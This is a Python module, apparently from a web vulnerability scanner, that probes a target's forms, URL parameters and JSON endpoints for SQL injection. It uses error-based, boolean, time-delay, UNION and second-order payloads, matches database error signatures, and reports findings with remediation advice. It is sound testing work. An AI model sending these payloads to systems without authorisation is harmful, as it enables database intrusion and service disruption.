import re
import time
import requests
from bs4 import BeautifulSoup
from difflib import SequenceMatcher
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from .base import Scanner, ScanResult, Finding, Severity, Confidence, FindingStatus
from ..services.evidence_redaction import redact_sensitive_text
from ..services.safe_http import SafeSession, safe_session


_OWASP_INJECTION = "A03:2021 - Injection"
_CWE_SQLI = "CWE-89"
_MITRE_SQLI = "T1190 - Exploit Public-Facing Application"


_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# ---------------------------------------------------------------------------
# Veritabanı hata kalıpları — küçük harf karşılaştırması için
# ---------------------------------------------------------------------------
_ERROR_PATTERNS = frozenset({
    # --- Genel ---
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "invalid query",
    "sql command not properly ended",
    "unexpected token",
    # --- MySQL / MariaDB ---
    "warning: mysql",
    "mysql_fetch_array",
    "mysql_fetch_row",
    "mysql_num_rows",
    "mysql_result",
    "supplied argument is not a valid mysql",
    "division by zero",
    "column count doesn't match value count",
    "unknown column",
    "table doesn't exist",
    "you have an error in your sql syntax; check the manual",
    # --- PostgreSQL ---
    "pg_query()",
    "pg_exec()",
    "postgresql query failed",
    "pg::syntaxerror",
    "error: unterminated quoted string",
    "error: invalid input syntax",
    "pdo::query()",
    "pg_connect()",
    # --- Microsoft SQL Server ---
    "microsoft sql native client",
    "odbc sql server driver",
    "microsoft ole db provider",
    "[microsoft][odbc",
    "mssql_query()",
    "sqlsrv_query()",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "conversion failed when converting",
    "sqlstate[42",
    # --- Oracle ---
    "ora-00933",
    "ora-00907",
    "ora-00942",
    "ora-01756",
    "ora-00936",
    "ora-06512",
    "oracle error",
    "oracle database",
    # --- SQLite ---
    "sqlite3::",
    "sqlite_error",
    "sqlite3.operationalerror",
    "no such table",
    "no such column",
    # --- IBM DB2 ---
    "db2 sql error",
    "sqlcode",
    "sqlstate 42",
    "com.ibm.db2",
    # --- Genel PDO / JDBC ---
    "pdo exception",
    "pdoexception",
    "java.sql.sqlexception",
    "org.hibernate",
    "com.mysql.jdbc",
})

# ---------------------------------------------------------------------------
# Hata bazlı payload'lar — DB-specific sözdizimi
# ---------------------------------------------------------------------------
_ERROR_PAYLOADS = [
    # Temel alıntı kapatma
    "'",
    "''",
    "\"",
    # MySQL yorumları
    "' --",
    "' #",
    "') --",
    "') #",
    # MSSQL stacked
    "'; --",
    "'; WAITFOR DELAY '0:0:0'--",
    # Oracle
    "' AND ROWNUM=1 --",
    # Boolean hatası
    "' OR 'x'='x' --",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
]

# ---------------------------------------------------------------------------
# Boolean bazlı çiftler: (true koşul, false koşul)
# ---------------------------------------------------------------------------
_BOOLEAN_PAIRS = [
    # Klasik OR
    ("' OR '1'='1' --",       "' OR '1'='2' --"),
    # AND bazlı
    ("' AND '1'='1' --",      "' AND '1'='2' --"),
    # Sayısal AND
    (" AND 1=1 --",            " AND 1=2 --"),
    # LIKE bazlı
    ("' AND 'a' LIKE 'a' --", "' AND 'a' LIKE 'b' --"),
    # MySQL IF()
    ("' AND IF(1=1,1,0)='1' --",  "' AND IF(1=2,1,0)='1' --"),
    # MSSQL IIF
    ("' AND IIF(1=1,1,0)=1 --",   "' AND IIF(1=2,1,0)=1 --"),
]

# ---------------------------------------------------------------------------
# Zaman bazlı: (payload, beklenen_gecikme_sn, veritabani)
# ---------------------------------------------------------------------------
_TIME_PAYLOADS = [
    ("' OR SLEEP(4)-- -",            4.0, "MySQL"),
    ("' OR SLEEP(4)#",               4.0, "MySQL"),
    ("'; WAITFOR DELAY '0:0:4'-- -", 4.0, "MSSQL"),
    ("'; SELECT pg_sleep(4)-- -",    4.0, "PostgreSQL"),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", 4.0, "Oracle"),
]

# ---------------------------------------------------------------------------
# UNION bazlı
# ---------------------------------------------------------------------------
_UNION_MAX_COLS   = 12
_ORDER_BY_PATTERN = re.compile(r"\b(syntax error|unknown column|order by|ora-\d|incorrect syntax)", re.I)

# ---------------------------------------------------------------------------
# JSON gövde enjeksiyonu — API endpoint işaretleri
# ---------------------------------------------------------------------------
_JSON_PATH_HINTS = frozenset({"/api/", "/graphql", "/v1/", "/v2/", "/rest/", "/gql"})
_JSON_FIELDS     = ("id", "query", "search", "filter", "name", "username", "email")

# ---------------------------------------------------------------------------
# İkinci dereceden SQLi — sonuç sayfası adayları
# ---------------------------------------------------------------------------
_SECOND_ORDER_PATHS = (
    "/profile", "/account", "/me", "/dashboard",
    "/user", "/result", "/results", "/search",
)

# ---------------------------------------------------------------------------
# Eşik değerleri
# ---------------------------------------------------------------------------
_BOOL_DIFF_THRESHOLD = 0.85
_TIME_MULTIPLIER     = 0.75

_SKIP_TYPES = frozenset({"submit", "button", "image", "reset", "file", "checkbox", "radio"})
_CSRF_NAMES = frozenset({"csrf", "csrftoken", "_token", "authenticity_token",
                          "__requestverificationtoken"})


def _is_csrf(name: str) -> bool:
    return any(c in name.lower() for c in _CSRF_NAMES)


def _extract_error_snippet(body: str, width: int = 150) -> str:
    """Hata içeren ilk kalıbın bulunduğu yeri 150 karakter olarak döner."""
    # Kanıt penceresi kesilmeden ÖNCE tüm gövde redakte edilir (yalnızca kanıt metni;
    # tespit ham gövde üzerinde yapılır)
    body = redact_sensitive_text(body)
    body_lower = body.lower()
    for pattern in _ERROR_PATTERNS:
        idx = body_lower.find(pattern)
        if idx != -1:
            start = max(0, idx - 20)
            end   = min(len(body), idx + width)
            raw   = body[start:end].strip()
            raw   = re.sub(r"\s+", " ", raw)
            return raw + ("…" if end < len(body) else "")
    return ""


# ===========================================================================


class SqlInjectionScanner(Scanner):
    def __init__(self, session: requests.Session | None = None, timeout: float = 10.0,
                 max_forms: int = 3, max_fields_per_form: int = 3):
        self._external_session   = session
        self.timeout             = timeout
        self.max_forms           = max_forms
        self.max_fields_per_form = max_fields_per_form

    def _make_session(self) -> SafeSession:
        if self._external_session:
            return safe_session(self._external_session)
        s = safe_session()
        s.headers["User-Agent"] = _USER_AGENT
        return s

    # -----------------------------------------------------------------------
    # Form yardımcıları
    # -----------------------------------------------------------------------

    def _form_details(self, form) -> dict:
        inputs = [
            {"type": t.get("type", "text"), "name": t.get("name"), "value": t.get("value", "")}
            for t in form.find_all("input")
        ]
        return {
            "action": form.get("action"),
            "method": form.get("method", "get").lower(),
            "inputs": inputs,
        }

    def _injectable_fields(self, details: dict) -> list[str]:
        fields = []
        for inp in details["inputs"]:
            t    = inp.get("type", "text").lower()
            name = inp.get("name") or ""
            if t in _SKIP_TYPES or not name or _is_csrf(name):
                continue
            fields.append(name)
        return fields

    def _build_data(self, details: dict, target_field: str, payload: str) -> dict:
        data = {}
        for inp in details["inputs"]:
            name = inp.get("name")
            if not name:
                continue
            data[name] = payload if name == target_field else (inp.get("value") or "test")
        return data

    def _submit(self, url: str, method: str, data: dict,
                session: requests.Session, timeout: float | None = None) -> requests.Response | None:
        t = timeout or self.timeout
        try:
            return session.post(url, data=data, timeout=t) if method == "post" \
                   else session.get(url, params=data, timeout=t)
        except requests.RequestException:
            return None

    # -----------------------------------------------------------------------
    # Hata tespiti + snippet
    # -----------------------------------------------------------------------

    def _has_sql_error(self, res: requests.Response) -> bool:
        body = res.content.decode(errors="replace").lower()
        return any(p in body for p in _ERROR_PATTERNS)

    def _new_sql_error(self, baseline_res: requests.Response | None,
                        test_res: requests.Response) -> bool:
        """DB hatasının baseline'da zaten var olup olmadığını kontrol eder.

        Baseline yanıtında zaten aynı hata varsa, bu payload'ın tetiklediği
        yeni bir kanıt değildir — CLAUDE.md'nin false-positive prensibiyle
        uyumlu olması için yalnızca YENİ ortaya çıkan hatalar sayılır.
        """
        if not self._has_sql_error(test_res):
            return False
        if baseline_res is None:
            return True
        baseline_body = baseline_res.content.decode(errors="replace").lower()
        test_body = test_res.content.decode(errors="replace").lower()
        matched = [p for p in _ERROR_PATTERNS if p in test_body]
        return any(p not in baseline_body for p in matched)

    def _error_snippet(self, res: requests.Response) -> str:
        return _extract_error_snippet(res.content.decode(errors="replace"))

    # -----------------------------------------------------------------------
    # Tespit yöntemleri — Form
    # -----------------------------------------------------------------------

    def _test_error_based(self, url: str, method: str, details: dict,
                          field: str, session: requests.Session, result: ScanResult) -> bool:
        # Baseline: zararsız bir değerle referans yanıt al — payload'ın YENİ bir
        # hata tetikleyip tetiklemediğini anlamak için gerekli (CLAUDE.md 2.1)
        baseline_res = self._submit(url, method, self._build_data(details, field, "lilith_baseline"), session)

        for payload in _ERROR_PAYLOADS:
            data = self._build_data(details, field, payload)
            res  = self._submit(url, method, data, session)
            if res and self._new_sql_error(baseline_res, res):
                snippet  = self._error_snippet(res)
                evidence = f"URL: {url} | Alan: {field} | Payload: {payload}"
                if snippet:
                    evidence += f" | Hata: {snippet}"
                result.findings.append(Finding(
                    severity=Severity.HIGH,
                    title="Potential SQL Injection - Database Error Triggered",
                    evidence=evidence,
                    confidence=Confidence.HIGH,
                    status=FindingStatus.POTENTIAL,
                    description="A database-specific error appeared only after the modified input was "
                                "submitted, and was absent from the baseline response for the same field.",
                    affected_url=url,
                    parameter=field,
                    owasp=_OWASP_INJECTION,
                    cwe=_CWE_SQLI,
                    mitre=_MITRE_SQLI,
                    recommendation="Use parameterized queries or prepared statements instead of concatenating "
                                   "user-controlled values into SQL statements.",
                ))
                return True
        return False

    def _test_boolean_based(self, url: str, method: str, details: dict,
                            field: str, session: requests.Session, result: ScanResult) -> bool:
        for true_p, false_p in _BOOLEAN_PAIRS:
            true_res  = self._submit(url, method, self._build_data(details, field, true_p),  session)
            false_res = self._submit(url, method, self._build_data(details, field, false_p), session)
            if not true_res or not false_res:
                continue
            true_body  = true_res.content.decode(errors="replace")
            false_body = false_res.content.decode(errors="replace")
            ratio = SequenceMatcher(None, true_body, false_body).ratio()
            if ratio >= _BOOL_DIFF_THRESHOLD:
                continue

            # Tek bir anomali yeterli değildir — sınırlı, tekrar bir doğrulama denemesi
            # yaparak davranışın tekrarlanabilir olup olmadığını kontrol et (CLAUDE.md 2.4)
            reproduced = self._verify_boolean_reproducible(url, method, details, field, true_p, false_p, session)

            result.findings.append(Finding(
                severity=Severity.MEDIUM,
                title="Potential SQL Injection - Boolean Response Difference",
                evidence=(
                    f"URL: {url} | Alan: {field} | "
                    f"True: {true_p} | False: {false_p} | "
                    f"Yanıt farklılığı: %{(1 - ratio) * 100:.0f} | "
                    f"Tekrarlanabilirlik: {'doğrulandı' if reproduced else 'doğrulanamadı'}"
                ),
                confidence=Confidence.HIGH if reproduced else Confidence.LOW,
                status=FindingStatus.POTENTIAL if reproduced else FindingStatus.MANUAL_REVIEW,
                description="The true/false condition pair produced a meaningfully different response, "
                            + ("and the difference reproduced on a follow-up verification request."
                               if reproduced else
                               "but the difference did not reproduce on a follow-up verification request, "
                               "so this may reflect dynamic page content rather than query logic."),
                affected_url=url,
                parameter=field,
                owasp=_OWASP_INJECTION,
                cwe=_CWE_SQLI,
            ))
            return True
        return False

    def _verify_boolean_reproducible(self, url: str, method: str, details: dict, field: str,
                                      true_p: str, false_p: str, session: requests.Session) -> bool:
        """Bulunan true/false farkını bir kez daha göndererek doğrular (sınırlı, tek tekrar)."""
        true_res  = self._submit(url, method, self._build_data(details, field, true_p),  session)
        false_res = self._submit(url, method, self._build_data(details, field, false_p), session)
        if not true_res or not false_res:
            return False
        ratio = SequenceMatcher(
            None,
            true_res.content.decode(errors="replace"),
            false_res.content.decode(errors="replace"),
        ).ratio()
        return ratio < _BOOL_DIFF_THRESHOLD

    def _test_time_based(self, url: str, method: str, details: dict,
                         field: str, baseline: float, session: requests.Session, result: ScanResult) -> bool:
        for payload, sleep_sec, db_label in _TIME_PAYLOADS:
            data = self._build_data(details, field, payload)
            t0   = time.time()
            self._submit(url, method, data, session, timeout=self.timeout)
            elapsed = time.time() - t0
            if elapsed < baseline + sleep_sec * _TIME_MULTIPLIER:
                continue

            # Tek bir yavaş istek yeterli kanıt değildir — sınırlı, tek bir doğrulama
            # tekrarı ile gecikmenin tekrarlanabilir olduğunu kontrol et (CLAUDE.md 2.5)
            t1 = time.time()
            self._submit(url, method, data, session, timeout=self.timeout)
            elapsed_repeat = time.time() - t1
            reproduced = elapsed_repeat >= baseline + sleep_sec * _TIME_MULTIPLIER

            result.findings.append(Finding(
                severity=Severity.CRITICAL,
                title=f"Potential Time-Based SQL Injection ({db_label})",
                evidence=(
                    f"URL: {url} | Alan: {field} | Gecikme: {elapsed:.1f}s "
                    f"(tekrar: {elapsed_repeat:.1f}s) | Payload: {payload}"
                ),
                confidence=Confidence.HIGH if reproduced else Confidence.LOW,
                status=FindingStatus.CONFIRMED if reproduced else FindingStatus.MANUAL_REVIEW,
                description="A response delay matching the injected sleep duration was observed"
                            + (" and reproduced on a follow-up request, which rules out a single network "
                               "jitter/latency spike as the explanation."
                               if reproduced else
                               ", but did not reproduce on a follow-up request — a single timing anomaly is "
                               "not reliable evidence of blind SQL injection on its own."),
                affected_url=url,
                parameter=field,
                owasp=_OWASP_INJECTION,
                cwe=_CWE_SQLI,
                mitre=_MITRE_SQLI if reproduced else None,
                recommendation="Use parameterized queries or prepared statements instead of concatenating "
                               "user-controlled values into SQL statements.",
            ))
            return True
        return False

    def _test_union_based(self, url: str, method: str, details: dict,
                          field: str, session: requests.Session, result: ScanResult) -> bool:
        """
        1. ORDER BY N ile sütun sayısı tespiti.
        2. UNION SELECT NULL,... ile yanıt değişimi kontrolü.
        """
        baseline_data = self._build_data(details, field, "test")
        baseline_res  = self._submit(url, method, baseline_data, session)
        if not baseline_res:
            return False
        baseline_body = baseline_res.content.decode(errors="replace")

        col_count = None
        for n in range(1, _UNION_MAX_COLS + 2):
            payload = f"' ORDER BY {n}-- -"
            data    = self._build_data(details, field, payload)
            res     = self._submit(url, method, data, session)
            if not res:
                continue
            body = res.content.decode(errors="replace")
            if self._has_sql_error(res) or _ORDER_BY_PATTERN.search(body):
                col_count = max(1, n - 1)
                break
            ratio = SequenceMatcher(None, baseline_body, body).ratio()
            if ratio < _BOOL_DIFF_THRESHOLD and n > 1:
                col_count = n - 1
                break

        if col_count is None:
            return False

        nulls   = ",".join(["NULL"] * col_count)
        payload = f"' UNION SELECT {nulls}-- -"
        data    = self._build_data(details, field, payload)
        res     = self._submit(url, method, data, session)
        if not res:
            return False

        body  = res.content.decode(errors="replace")
        ratio = SequenceMatcher(None, baseline_body, body).ratio()
        if not self._has_sql_error(res) and ratio < _BOOL_DIFF_THRESHOLD:
            result.findings.append(Finding(
                severity=Severity.HIGH,
                title="Potential SQL Injection - UNION Based",
                evidence=(
                    f"URL: {url} | Alan: {field} | "
                    f"Sütun sayısı: {col_count} (ORDER BY ile tespit edildi) | Payload: {payload}"
                ),
                confidence=Confidence.MEDIUM,
                status=FindingStatus.POTENTIAL,
                description="An ORDER BY boundary consistent with a specific column count was found, and the "
                            "corresponding UNION SELECT NULL payload changed the response relative to baseline. "
                            "A response change alone is not treated as confirmed — column-count correlation is "
                            "required, which this finding has, but exploitability was not further verified.",
                affected_url=url,
                parameter=field,
                owasp=_OWASP_INJECTION,
                cwe=_CWE_SQLI,
            ))
            return True
        return False

    # -----------------------------------------------------------------------
    # Tespit yöntemleri — JSON gövde enjeksiyonu
    # -----------------------------------------------------------------------

    def _looks_like_json_endpoint(self, url: str) -> bool:
        path = urlparse(url).path.lower()
        return any(hint in path for hint in _JSON_PATH_HINTS)

    def _test_json_injection(self, url: str, session: requests.Session, result: ScanResult) -> None:
        """JSON body ile hata bazlı SQL enjeksiyonu."""
        if not self._looks_like_json_endpoint(url):
            return

        # Baseline: geçerli JSON, zararsız değerler — malformed JSON parser hatasını
        # DB hatasından ayırmak ve zaten var olan hata metnini elemek için (CLAUDE.md 2.7)
        baseline_body_map = {field: "lilith_baseline" for field in _JSON_FIELDS}
        try:
            baseline_res = session.post(url, json=baseline_body_map, timeout=self.timeout)
        except requests.RequestException:
            baseline_res = None

        for payload in _ERROR_PAYLOADS[:6]:
            body = {field: payload for field in _JSON_FIELDS}
            try:
                res = session.post(url, json=body, timeout=self.timeout)
            except requests.RequestException:
                continue
            if self._new_sql_error(baseline_res, res):
                snippet  = self._error_snippet(res)
                evidence = f"URL: {url} | Tip: JSON gövde | Payload: {payload}"
                if snippet:
                    evidence += f" | Hata: {snippet}"
                result.findings.append(Finding(
                    severity=Severity.HIGH,
                    title="Potential SQL Injection - Database Error Triggered (JSON)",
                    evidence=evidence,
                    confidence=Confidence.HIGH,
                    status=FindingStatus.POTENTIAL,
                    description="A database-specific error appeared only after a JSON field value was "
                                "modified, and was absent from the baseline (valid-JSON) response — this is "
                                "distinguished from a generic JSON parser rejection.",
                    affected_url=url,
                    owasp=_OWASP_INJECTION,
                    cwe=_CWE_SQLI,
                    mitre=_MITRE_SQLI,
                    recommendation="Use parameterized queries or prepared statements instead of concatenating "
                                   "user-controlled JSON field values into SQL statements.",
                ))
                return

    # -----------------------------------------------------------------------
    # Tespit yöntemleri — İkinci dereceden SQLi
    # -----------------------------------------------------------------------

    def _test_second_order(self, target: str, url: str, method: str, details: dict,
                           field: str, session: requests.Session, result: ScanResult) -> bool:
        """Payload gönder → redirect veya ilgili sayfalarda hata tara."""
        payload = "' OR SLEEP(0)-- "
        data    = self._build_data(details, field, payload)
        submit_res = self._submit(url, method, data, session)
        if not submit_res:
            return False

        # Gönderim sonrası gerçek redirect hedefi, tahmin edilen yollardan daha güçlü
        # bir nedensellik ilişkisine sahiptir — bu yüzden ayrı işaretlenir.
        redirect_target = submit_res.url if (hasattr(submit_res, "url") and submit_res.url
                                              and submit_res.url != url) else None

        check_urls: list[str] = []
        if redirect_target:
            check_urls.append(redirect_target)

        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"
        for path in _SECOND_ORDER_PATHS:
            check_urls.append(base + path)

        for check_url in check_urls[:5]:
            try:
                res = session.get(check_url, timeout=self.timeout)
            except requests.RequestException:
                continue
            if self._has_sql_error(res):
                snippet = self._error_snippet(res)
                is_redirect_target = check_url == redirect_target
                # Bu korelasyon yalnızca "gönderimden sonra bu sayfada bir DB hatası var"
                # gözlemine dayanır — enjekte edilen marker'ın kendisi doğrulanmadığından
                # her zaman MANUAL_REVIEW olarak işaretlenir, asla CONFIRMED değil.
                result.findings.append(Finding(
                    severity=Severity.HIGH,
                    title="Potential Second-Order SQL Injection",
                    evidence=(
                        f"Gönderim: {url} | Kontrol: {check_url} | Alan: {field}"
                        + (f" | Hata: {snippet}" if snippet else "")
                    ),
                    confidence=Confidence.MEDIUM if is_redirect_target else Confidence.LOW,
                    status=FindingStatus.MANUAL_REVIEW,
                    description="A database error was observed on a page visited after submission, but this "
                                "correlation is based on error presence only — the injected marker's actual "
                                "propagation into a later query was not verified, so this requires manual "
                                "confirmation rather than being treated as confirmed.",
                    affected_url=check_url,
                    parameter=field,
                    owasp=_OWASP_INJECTION,
                    cwe=_CWE_SQLI,
                ))
                return True
        return False

    # -----------------------------------------------------------------------
    # Tespit yöntemleri — URL parametreleri
    # -----------------------------------------------------------------------

    def _test_url_params(self, url: str, baseline: float,
                         session: requests.Session, result: ScanResult) -> None:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        flat = {k: v[0] for k, v in params.items()}

        for param_name in flat:
            if _is_csrf(param_name):
                continue

            # Baseline: zararsız değerle referans yanıt (CLAUDE.md 2.1)
            baseline_injected = {k: ("lilith_baseline" if k == param_name else v) for k, v in flat.items()}
            baseline_url = urlunparse(parsed._replace(query=urlencode(baseline_injected)))
            try:
                baseline_res = session.get(baseline_url, timeout=self.timeout)
            except requests.RequestException:
                baseline_res = None

            # 1. Hata bazlı
            found = False
            for payload in _ERROR_PAYLOADS:
                injected = {k: (payload if k == param_name else v) for k, v in flat.items()}
                test_url = urlunparse(parsed._replace(query=urlencode(injected)))
                try:
                    res = session.get(test_url, timeout=self.timeout)
                    if self._new_sql_error(baseline_res, res):
                        snippet  = self._error_snippet(res)
                        evidence = f"URL: {test_url} | Parametre: {param_name} | Payload: {payload}"
                        if snippet:
                            evidence += f" | Hata: {snippet}"
                        result.findings.append(Finding(
                            severity=Severity.HIGH,
                            title="Potential SQL Injection - Database Error Triggered (URL Parameter)",
                            evidence=evidence,
                            confidence=Confidence.HIGH,
                            status=FindingStatus.POTENTIAL,
                            description="A database-specific error appeared only after this URL parameter's "
                                        "value was modified, and was absent from the baseline response.",
                            affected_url=test_url,
                            parameter=param_name,
                            owasp=_OWASP_INJECTION,
                            cwe=_CWE_SQLI,
                            mitre=_MITRE_SQLI,
                            recommendation="Use parameterized queries or prepared statements instead of "
                                           "concatenating user-controlled values into SQL statements.",
                        ))
                        found = True
                        break
                except requests.RequestException:
                    continue
            if found:
                continue

            # 2. Boolean bazlı
            for true_p, false_p in _BOOLEAN_PAIRS:
                def _make(p, _flat=flat, _parsed=parsed, _pn=param_name):
                    inj = {k: (p if k == _pn else v) for k, v in _flat.items()}
                    return urlunparse(_parsed._replace(query=urlencode(inj)))
                try:
                    r_true  = session.get(_make(true_p),  timeout=self.timeout)
                    r_false = session.get(_make(false_p), timeout=self.timeout)
                    ratio = SequenceMatcher(
                        None,
                        r_true.content.decode(errors="replace"),
                        r_false.content.decode(errors="replace"),
                    ).ratio()
                    if ratio < _BOOL_DIFF_THRESHOLD:
                        result.findings.append(Finding(
                            severity=Severity.MEDIUM,
                            title="Potential SQL Injection - Boolean Response Difference (URL Parameter)",
                            evidence=(
                                f"Parametre: {param_name} | "
                                f"True: {true_p} | False: {false_p} | "
                                f"Yanıt farklılığı: %{(1 - ratio) * 100:.0f}"
                            ),
                            confidence=Confidence.MEDIUM,
                            status=FindingStatus.MANUAL_REVIEW,
                            description="The true/false condition pair produced a meaningfully different "
                                        "response for this URL parameter. A single verification pass was not "
                                        "performed for URL parameters, so this is reported conservatively.",
                            affected_url=_make(true_p),
                            parameter=param_name,
                            owasp=_OWASP_INJECTION,
                            cwe=_CWE_SQLI,
                        ))
                        break
                except requests.RequestException:
                    continue

    # -----------------------------------------------------------------------
    # Ana tarama
    # -----------------------------------------------------------------------

    def scan(self, target: str) -> ScanResult:
        result  = ScanResult(scanner="sql", target=target)
        session = self._make_session()

        try:
            t0       = time.time()
            response = session.get(target, timeout=self.timeout)
            baseline = time.time() - t0
        except requests.RequestException as e:
            result.error = str(e)
            return result

        forms = BeautifulSoup(response.content, "html.parser").find_all("form")
        result.findings.append(Finding(severity=Severity.INFO, title="forms_detected", evidence=str(len(forms))))

        # URL parametrelerini test et
        self._test_url_params(target, baseline, session, result)

        # JSON endpoint testi (hedef URL'nin kendisi API ise)
        self._test_json_injection(target, session, result)

        # Form alanlarını test et
        for form in forms[:self.max_forms]:
            details    = self._form_details(form)
            action_url = urljoin(target, details["action"] or target)
            method     = details["method"]

            # Form action URL'si JSON endpoint mi?
            self._test_json_injection(action_url, session, result)

            for field in self._injectable_fields(details)[:self.max_fields_per_form]:
                # 1. Hata bazlı (hızlı)
                if self._test_error_based(action_url, method, details, field, session, result):
                    continue

                # 2. Boolean bazlı
                if self._test_boolean_based(action_url, method, details, field, session, result):
                    continue

                # 3. UNION bazlı
                if self._test_union_based(action_url, method, details, field, session, result):
                    continue

                # 4. İkinci dereceden
                if self._test_second_order(target, action_url, method, details, field, session, result):
                    continue

                # 5. Zaman bazlı (yavaş, son çare)
                self._test_time_based(action_url, method, details, field, baseline, session, result)

        return result
